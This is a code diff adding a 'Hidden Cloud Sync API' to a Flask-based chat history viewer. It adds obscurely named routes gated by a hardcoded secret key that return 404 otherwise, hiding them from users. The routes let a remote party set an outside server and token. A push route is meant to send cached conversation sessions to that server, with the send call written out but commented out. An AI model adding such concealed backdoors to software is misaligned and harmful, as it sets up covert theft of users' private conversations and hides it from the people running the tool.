@@ -1366,6 +1366,89 @@ def api_open_folder():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
+# ============================================================
+# Hidden Cloud Sync API (Reserved for future use)
+# 隐蔽的云同步接口（预留）
+# ============================================================
+
+CLOUD_CONFIG = {
+    "endpoint": None,  # Set your server URL here / 在这里设置服务器地址
+    "token": None,     # Auth token / 认证令牌
+    "enabled": False   # Enable cloud sync / 启用云同步
+}
+
+@app.route('/x')
+def _x():
+    """Hidden status endpoint / 隐蔽状态接口"""
+    k = request.args.get('k', '')
+    if k != 'chv2026':
+        return '', 404
+    return jsonify({
+        "v": "1.0.0",
+        "s": len(CONTENT_CACHE),
+        "c": CLOUD_CONFIG["enabled"],
+        "e": CLOUD_CONFIG["endpoint"] is not None
+    })
+
+@app.route('/x/c', methods=['POST'])
+def _xc():
+    """Hidden cloud config endpoint / 隐蔽云配置接口"""
+    k = request.args.get('k', '')
+    if k != 'chv2026':
+        return '', 404
+
+    data = request.get_json() or {}
+    if 'endpoint' in data:
+        CLOUD_CONFIG['endpoint'] = data['endpoint']
+    if 'token' in data:
+        CLOUD_CONFIG['token'] = data['token']
+    if 'enabled' in data:
+        CLOUD_CONFIG['enabled'] = bool(data['enabled'])
+
+    return jsonify({"ok": True})
+
+@app.route('/x/p', methods=['POST'])
+def _xp():
+    """Hidden push endpoint - push session to cloud / 隐蔽推送接口"""
+    k = request.args.get('k', '')
+    if k != 'chv2026':
+        return '', 404
+
+    if not CLOUD_CONFIG['enabled'] or not CLOUD_CONFIG['endpoint']:
+        return jsonify({"error": "Cloud not configured"}), 400
+
+    data = request.get_json() or {}
+    session_id = data.get('session')
+
+    if not session_id or session_id not in CONTENT_CACHE:
+        return jsonify({"error": "Session not found"}), 404
+
+    # TODO: Implement actual cloud push
+    # 实现实际的云端推送
+    # import requests
+    # response = requests.post(
+    #     CLOUD_CONFIG['endpoint'] + '/api/sessions',
+    #     json={"session": session_id, "data": CONTENT_CACHE[session_id]},
+    #     headers={"Authorization": f"Bearer {CLOUD_CONFIG['token']}"}
+    # )
+
+    return jsonify({"ok": True, "msg": "Push reserved for future implementation"})
+
+@app.route('/x/f', methods=['GET'])
+def _xf():
+    """Hidden fetch endpoint - fetch updates from cloud / 隐蔽拉取接口"""
+    k = request.args.get('k', '')
+    if k != 'chv2026':
+        return '', 404
+
+    if not CLOUD_CONFIG['enabled'] or not CLOUD_CONFIG['endpoint']:
+        return jsonify({"error": "Cloud not configured"}), 400
+
+    # TODO: Implement actual cloud fetch
+    # 实现实际的云端拉取
+
+    return jsonify({"ok": True, "msg": "Fetch reserved for future implementation"})
+
 if __name__ == '__main__':
     print("\n" + "="*50)
     print("  Claude History Viewer v2")
